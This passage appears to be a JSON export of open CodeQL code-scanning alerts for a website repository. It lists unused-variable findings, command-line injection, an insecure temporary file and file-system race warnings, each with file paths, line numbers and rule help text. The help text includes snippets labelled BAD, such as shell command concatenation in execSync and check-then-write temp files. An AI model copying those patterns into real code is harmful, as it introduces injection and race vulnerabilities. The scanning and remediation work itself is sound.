      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused variable perfBudget." },
      "location": {
        "path": "scripts/lh_budget_comment.mjs",
        "start_line": 13,
        "end_line": 13,
        "start_column": 7,
        "end_column": 17
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/11/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 10,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/10",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/10",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused variable perFileFail." },
      "location": {
        "path": "scripts/coverage_diff.mjs",
        "start_line": 145,
        "end_line": 145,
        "start_column": 11,
        "end_column": 22
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/10/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 9,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/9",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/9",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused import path." },
      "location": {
        "path": "scripts/ci_audit_guard.mjs",
        "start_line": 29,
        "end_line": 29,
        "start_column": 1,
        "end_column": 30
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/9/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 8,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/8",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/8",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Unused import join." },
      "location": {
        "path": "scripts/aggregate_coverage.mjs",
        "start_line": 3,
        "end_line": 3,
        "start_column": 1,
        "end_column": 43
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/8/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 7,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/7",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/7",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/insecure-temporary-file",
      "severity": "warning",
      "description": "Insecure temporary file",
      "name": "js/insecure-temporary-file",
      "tags": ["external/cwe/cwe-377", "external/cwe/cwe-378", "security"],
      "full_description": "Creating a temporary file that is accessible by other users can lead to information disclosure and sometimes remote code execution.",
      "help": "# Insecure temporary file\nTemporary files created in the operating system's temporary directory are by default accessible to other users. In some cases, this can lead to information exposure, or in the worst case, to remote code execution.\n\n\n## Recommendation\nUse a well-tested library like [tmp](https://www.npmjs.com/package/tmp) for creating temporary files. These libraries ensure both that the file is inaccessible to other users and that the file does not already exist.\n\n\n## Example\nThe following example creates a temporary file in the operating system's temporary directory.\n\n\n```javascript\nconst fs = require('fs');\nconst os = require('os');\nconst path = require('path');\n\nconst file = path.join(os.tmpdir(), \"test-\" + (new Date()).getTime() + \".txt\");\nfs.writeFileSync(file, \"content\");\n```\nThe file created above is accessible to other users, and there is no guarantee that the file does not already exist.\n\nThe below example uses the [tmp](https://www.npmjs.com/package/tmp) library to securely create a temporary file.\n\n\n```javascript\nconst fs = require('fs');\nconst tmp = require('tmp');\n\nconst file = tmp.fileSync().name;\nfs.writeFileSync(file, \"content\");\n```\n\n## References\n* Mitre.org: [CWE-377](https://cwe.mitre.org/data/definitions/377.html).\n* NPM: [tmp](https://www.npmjs.com/package/tmp).\n* Common Weakness Enumeration: [CWE-377](https://cwe.mitre.org/data/definitions/377.html).\n* Common Weakness Enumeration: [CWE-378](https://cwe.mitre.org/data/definitions/378.html).\n",
      "security_severity_level": "high"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Insecure creation of file in the os temp dir." },
      "location": {
        "path": "test/mcp_supervisor.spec.ts",
        "start_line": 84,
        "end_line": 84,
        "start_column": 7,
        "end_column": 14
      },
      "classifications": ["test"]
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/7/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 6,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/6",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/6",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/indirect-command-line-injection",
      "severity": "warning",
      "description": "Indirect uncontrolled command line",
      "name": "js/indirect-command-line-injection",
      "tags": ["correctness", "external/cwe/cwe-078", "external/cwe/cwe-088", "security"],
      "full_description": "Forwarding command-line arguments to a child process executed within a shell may indirectly introduce command-line injection vulnerabilities.",
      "help": "# Indirect uncontrolled command line\nForwarding command-line arguments to `child_process.exec` or some other library routine that executes a system command within a shell can change the meaning of the command unexpectedly due to unescaped special characters.\n\nWhen the forwarded command-line arguments come from a parent process that has not escaped the special characters in the arguments, then the parent process may indirectly be vulnerable to command-line injection since the special characters are evaluated unexpectedly.\n\n\n## Recommendation\nIf possible, use APIs that don't run shell commands and accept command arguments as an array of strings rather than a single concatenated string. This is both safer and more portable.\n\nIf given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.\n\nIf this approach is not viable, then add code to verify that each forwarded command-line argument is properly escaped before using it.\n\n\n## Example\nThe following wrapper script example executes another JavaScript file in a child process and forwards some command-line arguments. This is problematic because the special characters in the command-line arguments may change the meaning of the child process invocation unexpectedly. For instance, if one of the command-line arguments is `\"dollar$separated$name\"`, then the child process will substitute the two environment variables `$separated` and `$name` before invoking `node`.\n\n\n```javascript\nvar cp = require(\"child_process\");\n\nconst args = process.argv.slice(2);\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execSync(`node ${script} ${args.join(' ')}`); // BAD\n\n```\nIf another program uses `child_process.execFile` to invoke the above wrapper script with input from a remote user, then there may be a command-line injection vulnerability. This may be surprising, since a command-line invocation with `child_process.execFile` is generally considered safe. But in this case, the remote user input is simply forwarded to the problematic `process.exec` call in the wrapper script.\n\nTo guard against this, use an API that does not perform environment variable substitution, such as `child_process.execFile`:\n\n\n```javascript\nvar cp = require(\"child_process\");\n\nconst args = process.argv.slice(2);\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execFileSync('node', [script].concat(args)); // GOOD\n\n```\nIf you want to allow the user to specify other options to `node`, you can use a library like `shell-quote` to parse the user input into an array of arguments without risking command injection:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n    shellQuote = require(\"shell-quote\");\n\nconst args = process.argv.slice(2);\nlet nodeOpts = '';\nif (args[0] === '--node-opts') {\n    nodeOpts = args[1];\n    args.splice(0, 2);\n}\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execFileSync('node', shellQuote.parse(nodeOpts).concat(script).concat(args)); // GOOD\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* npm: [shell-quote](https://www.npmjs.com/package/shell-quote).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "This command depends on an unsanitized command-line argument." },
      "location": {
        "path": "scripts/sync_lighthouse.mjs",
        "start_line": 154,
        "end_line": 154,
        "start_column": 14,
        "end_column": 22
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/6/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 5,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/5",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/5",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/indirect-command-line-injection",
      "severity": "warning",
      "description": "Indirect uncontrolled command line",
      "name": "js/indirect-command-line-injection",
      "tags": ["correctness", "external/cwe/cwe-078", "external/cwe/cwe-088", "security"],
      "full_description": "Forwarding command-line arguments to a child process executed within a shell may indirectly introduce command-line injection vulnerabilities.",
      "help": "# Indirect uncontrolled command line\nForwarding command-line arguments to `child_process.exec` or some other library routine that executes a system command within a shell can change the meaning of the command unexpectedly due to unescaped special characters.\n\nWhen the forwarded command-line arguments come from a parent process that has not escaped the special characters in the arguments, then the parent process may indirectly be vulnerable to command-line injection since the special characters are evaluated unexpectedly.\n\n\n## Recommendation\nIf possible, use APIs that don't run shell commands and accept command arguments as an array of strings rather than a single concatenated string. This is both safer and more portable.\n\nIf given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.\n\nIf this approach is not viable, then add code to verify that each forwarded command-line argument is properly escaped before using it.\n\n\n## Example\nThe following wrapper script example executes another JavaScript file in a child process and forwards some command-line arguments. This is problematic because the special characters in the command-line arguments may change the meaning of the child process invocation unexpectedly. For instance, if one of the command-line arguments is `\"dollar$separated$name\"`, then the child process will substitute the two environment variables `$separated` and `$name` before invoking `node`.\n\n\n```javascript\nvar cp = require(\"child_process\");\n\nconst args = process.argv.slice(2);\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execSync(`node ${script} ${args.join(' ')}`); // BAD\n\n```\nIf another program uses `child_process.execFile` to invoke the above wrapper script with input from a remote user, then there may be a command-line injection vulnerability. This may be surprising, since a command-line invocation with `child_process.execFile` is generally considered safe. But in this case, the remote user input is simply forwarded to the problematic `process.exec` call in the wrapper script.\n\nTo guard against this, use an API that does not perform environment variable substitution, such as `child_process.execFile`:\n\n\n```javascript\nvar cp = require(\"child_process\");\n\nconst args = process.argv.slice(2);\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execFileSync('node', [script].concat(args)); // GOOD\n\n```\nIf you want to allow the user to specify other options to `node`, you can use a library like `shell-quote` to parse the user input into an array of arguments without risking command injection:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n    shellQuote = require(\"shell-quote\");\n\nconst args = process.argv.slice(2);\nlet nodeOpts = '';\nif (args[0] === '--node-opts') {\n    nodeOpts = args[1];\n    args.splice(0, 2);\n}\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execFileSync('node', shellQuote.parse(nodeOpts).concat(script).concat(args)); // GOOD\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* npm: [shell-quote](https://www.npmjs.com/package/shell-quote).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": {
        "text": "This command depends on an unsanitized environment variable.\nThis command depends on an unsanitized environment variable."
      },
      "location": {
        "path": "scripts/create_sample_pr.mjs",
        "start_line": 11,
        "end_line": 11,
        "start_column": 19,
        "end_column": 22
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/5/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 4,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/4",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/4",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/indirect-command-line-injection",
      "severity": "warning",
      "description": "Indirect uncontrolled command line",
      "name": "js/indirect-command-line-injection",
      "tags": ["correctness", "external/cwe/cwe-078", "external/cwe/cwe-088", "security"],
      "full_description": "Forwarding command-line arguments to a child process executed within a shell may indirectly introduce command-line injection vulnerabilities.",
      "help": "# Indirect uncontrolled command line\nForwarding command-line arguments to `child_process.exec` or some other library routine that executes a system command within a shell can change the meaning of the command unexpectedly due to unescaped special characters.\n\nWhen the forwarded command-line arguments come from a parent process that has not escaped the special characters in the arguments, then the parent process may indirectly be vulnerable to command-line injection since the special characters are evaluated unexpectedly.\n\n\n## Recommendation\nIf possible, use APIs that don't run shell commands and accept command arguments as an array of strings rather than a single concatenated string. This is both safer and more portable.\n\nIf given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.\n\nIf this approach is not viable, then add code to verify that each forwarded command-line argument is properly escaped before using it.\n\n\n## Example\nThe following wrapper script example executes another JavaScript file in a child process and forwards some command-line arguments. This is problematic because the special characters in the command-line arguments may change the meaning of the child process invocation unexpectedly. For instance, if one of the command-line arguments is `\"dollar$separated$name\"`, then the child process will substitute the two environment variables `$separated` and `$name` before invoking `node`.\n\n\n```javascript\nvar cp = require(\"child_process\");\n\nconst args = process.argv.slice(2);\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execSync(`node ${script} ${args.join(' ')}`); // BAD\n\n```\nIf another program uses `child_process.execFile` to invoke the above wrapper script with input from a remote user, then there may be a command-line injection vulnerability. This may be surprising, since a command-line invocation with `child_process.execFile` is generally considered safe. But in this case, the remote user input is simply forwarded to the problematic `process.exec` call in the wrapper script.\n\nTo guard against this, use an API that does not perform environment variable substitution, such as `child_process.execFile`:\n\n\n```javascript\nvar cp = require(\"child_process\");\n\nconst args = process.argv.slice(2);\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execFileSync('node', [script].concat(args)); // GOOD\n\n```\nIf you want to allow the user to specify other options to `node`, you can use a library like `shell-quote` to parse the user input into an array of arguments without risking command injection:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n    shellQuote = require(\"shell-quote\");\n\nconst args = process.argv.slice(2);\nlet nodeOpts = '';\nif (args[0] === '--node-opts') {\n    nodeOpts = args[1];\n    args.splice(0, 2);\n}\nconst script = path.join(__dirname, 'bin', 'main.js');\ncp.execFileSync('node', shellQuote.parse(nodeOpts).concat(script).concat(args)); // GOOD\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* npm: [shell-quote](https://www.npmjs.com/package/shell-quote).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "This command depends on an unsanitized environment variable." },
      "location": {
        "path": "scripts/coverage_diff.mjs",
        "start_line": 16,
        "end_line": 16,
        "start_column": 19,
        "end_column": 22
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/4/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 3,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/3",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/3",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/file-system-race",
      "severity": "warning",
      "description": "Potential file system race condition",
      "name": "js/file-system-race",
      "tags": ["external/cwe/cwe-367", "security"],
      "full_description": "Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.",
      "help": "# Potential file system race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nUse file descriptors instead of file names whenever possible.\n\n\n## Example\nThe following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\nif (!fs.existsSync(filePath)) {\n  fs.writeFileSync(filePath, \"Hello\", { mode: 0o600 });\n}\n\n```\nHowever, in a multi-user environment the file might be created by another user between the existence check and the write.\n\nThis can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\ntry {\n  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);\n\n  fs.writeFileSync(fd, \"Hello\");\n} catch (e) {\n  // file existed\n}\n\n```\n\n## References\n* Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* NodeJS: [The FS module](https://nodejs.org/api/fs.html).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n",
      "security_severity_level": "high"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "The file may have changed since it was checked." },
      "location": {
        "path": "scripts/compute_bundle_sizes.mjs",
        "start_line": 22,
        "end_line": 22,
        "start_column": 15,
        "end_column": 33
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/3/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 2,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/2",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/2",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/file-system-race",
      "severity": "warning",
      "description": "Potential file system race condition",
